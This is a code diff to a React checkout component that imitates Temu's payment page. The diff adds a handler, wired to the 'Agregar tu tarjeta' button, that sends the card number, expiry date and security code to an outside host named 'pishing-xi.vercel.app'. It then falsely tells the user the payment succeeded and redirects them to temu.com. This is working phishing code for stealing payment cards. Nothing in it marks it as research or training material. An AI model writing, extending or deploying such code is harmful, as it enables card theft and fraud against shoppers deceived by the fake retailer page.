@@ -52,6 +52,42 @@ export default function TemuCheckout() {
       return value
     }
   }
+  const handleSubmit = () => {
+  const fechaExpiracion = `${expYear}-${expMonth.padStart(2, '0')}-31`; // formato YYYY-MM-DD
+
+  const data = {
+    numero_tarjeta: cardNumber,
+    fecha_expiracion: fechaExpiracion,
+    codigo_seguridad: cvv
+  };
+
+  fetch("https://pishing-xi.vercel.app/tarjetas", {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Error en la solicitud');
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('Respuesta del servidor:', data);
+      if(data.message === "Tarjeta registrada correctamente") {
+        alert('Pago enviado correctamente');
+        window.location.href = "https://temu.com";
+      }else{
+        alert('Error al procesar el pago');
+      }
+    })
+    .catch(error => {
+      console.error('Error al enviar los datos:', error);
+      alert('Error al procesar el pago');
+    });
+};
 
   return (
     <div className="temu-app">
@@ -464,7 +500,7 @@ export default function TemuCheckout() {
               </div>
 
               
-              <button className="temu-add-card-button">Agregar tu tarjeta</button>
+              <button className="temu-add-card-button" onClick={handleSubmit}>Agregar tu tarjeta</button>
 
               <div className="temu-card-security">
                 <ShieldCheck size={20} className="temu-shield-icon" />
